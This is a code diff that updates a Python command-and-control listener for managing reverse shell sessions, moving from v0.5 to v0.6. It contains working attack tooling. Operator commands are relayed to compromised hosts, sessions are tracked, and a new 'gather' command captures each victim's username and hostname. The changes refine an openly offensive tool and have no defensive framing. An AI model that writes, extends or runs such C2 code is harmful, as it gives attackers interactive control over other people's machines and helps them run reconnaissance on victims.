@@ -76,6 +76,7 @@ def print_menu():
 ╚════════════════════════════════════════════════════════════╝{RESET}"""
     print(message)
     log_to_file("Displayed menu.")
+
 def handle_client(client_socket, addr, session_number):
     """Creates a fully interactive reverse shell with real-time output."""
     print(f"{GREEN}[+] Session {session_number} connected from {addr}{RESET}")
@@ -107,39 +108,20 @@ def handle_client(client_socket, addr, session_number):
     recv_thread.start()
 
     try:
-        # Only fetch whoami and hostname if they are not already set
-        with lock:
-            if session_number not in sessions:
-                sessions[session_number] = {}
-            
-            if "whoami" not in sessions[session_number]:
-                client_socket.sendall(b"whoami\n")
-                whoami_output = client_socket.recv(4096).decode(errors="ignore").strip()
-                whoami_output = clean_output(whoami_output)  # Clean the output from command prompt
-                sessions[session_number]["whoami"] = whoami_output
-                print(f"{ORANGE}Captured whoami: {whoami_output}{RESET}")
-                log_to_file(f"Captured whoami: {whoami_output}")
-            
-            if "hostname" not in sessions[session_number]:
-                client_socket.sendall(b"hostname\n")
-                hostname_output = client_socket.recv(4096).decode(errors="ignore").strip()
-                hostname_output = clean_output(hostname_output)  # Clean the output from command prompt
-                sessions[session_number]["hostname"] = hostname_output
-                print(f"{ORANGE}Captured hostname: {hostname_output}{RESET}")
-                log_to_file(f"Captured hostname: {hostname_output}")
-
+        # Skip automatic whoami and hostname retrieval
         while True:
             command = sys.stdin.readline().strip()  # Read user input properly
 
             # Log the user input command
             if command:
                 log_to_file(f"Command: {command}")
-                # readline.add_history(command) # couldn't get to work properly
+
             if command.lower() == "bs":
                 print(f"{ORANGE}[*] Session {session_number} moved to background.{RESET}")
                 log_to_file(f"[*] Session {session_number} moved to background.")
                 stop_event.set()
                 return
+
             if command.lower() == "die":
                 print(f"{ORANGE}[-] Terminating session {session_number}.{RESET}")
                 log_to_file(f"[-] Terminating session {session_number}.")
@@ -155,7 +137,38 @@ def handle_client(client_socket, addr, session_number):
                     del sessions[session_number]
                 return
 
-            client_socket.sendall(command.encode() + b"\n")
+            # Check for "update_info" command
+            if command.lower() == "gather":
+                try:
+                    # The session we're currently working with
+                    session = sessions[session_number]  # Get the current session using its session number
+                    client_socket = session["socket"]  # The client's socket for this session
+
+                    # Gather whoami if not already present
+                    if "whoami" not in session:
+                        client_socket.sendall(b"whoami\n")
+                        whoami_output = client_socket.recv(4096).decode(errors="ignore").strip()
+                        whoami_output = clean_output(whoami_output)
+                        session["whoami"] = whoami_output
+                        print(f"{ORANGE}Captured whoami for session {session_number}: {whoami_output}{RESET}")
+                        log_to_file(f"Captured whoami for session {session_number}: {whoami_output}")
+
+                    # Gather hostname if not already present
+                    if "hostname" not in session:
+                        client_socket.sendall(b"hostname\n")
+                        hostname_output = client_socket.recv(4096).decode(errors="ignore").strip()
+                        hostname_output = clean_output(hostname_output)
+                        session["hostname"] = hostname_output
+                        print(f"{ORANGE}Captured hostname for session {session_number}: {hostname_output}{RESET}")
+                        log_to_file(f"Captured hostname for session {session_number}: {hostname_output}")
+
+                except Exception as e:
+                    print_error(f"Error during gather for session {session_number}: {e}")
+
+            
+            # Send other commands to the client
+            else:
+                client_socket.sendall(command.encode() + b"\n")
 
     except KeyboardInterrupt:
         print(f"\n{ORANGE}[*] Session {session_number} moved to background.{RESET}")
@@ -177,6 +190,7 @@ def handle_client(client_socket, addr, session_number):
     with lock:
         del sessions[session_number]
 
+
 def format_session_table(sessions):
     """Formats the session table with fixed padding and alignment."""
     
@@ -194,8 +208,6 @@ def format_session_table(sessions):
         table += f"{str(session['id']).ljust(id_width)}{session['ip'].ljust(ip_width)}{session['hostname'].ljust(hostname_width)}{session['user'].ljust(user_width)}\n"
 
     return table
-
-
 
 def session_manager():
     """Main menu that allows session management."""
@@ -218,6 +230,10 @@ def session_manager():
             elif command == "?":
                 print_menu()
             elif command.lower() == "ls":
+                # Display new connection notification first if available
+                while not notifications.empty():
+                    print(notifications.get())  # Print the notifications for new connections
+
                 # Prepare the session list in a formatted way
                 session_list = []
                 for sid, session in sessions.items():
@@ -235,6 +251,7 @@ def session_manager():
                 # Log the session table into the file
                 log_to_file("Session list displayed:")
                 log_to_file(formatted_table)
+
                 
             elif command.startswith("cs "):
                 try:
@@ -267,6 +284,7 @@ def session_manager():
         except Exception as e:
             print_error(str(e))
 
+
 def start_listener():
     """Starts the listener and accepts incoming connections."""
     global session_id
@@ -288,7 +306,7 @@ def start_listener():
     ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
     ███████╗███████║   ██║   ██║ ╚████║██║  ██║
     ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
-    Remote Command & Control - v0.5
+    Remote Command & Control - v0.6
     - MADE FOR REVERSE SHELL MANAGEMENT{RESET}
     """)
     print(f"{ORANGE}[*] Listening on {HOST}:{PORT}{RESET}")
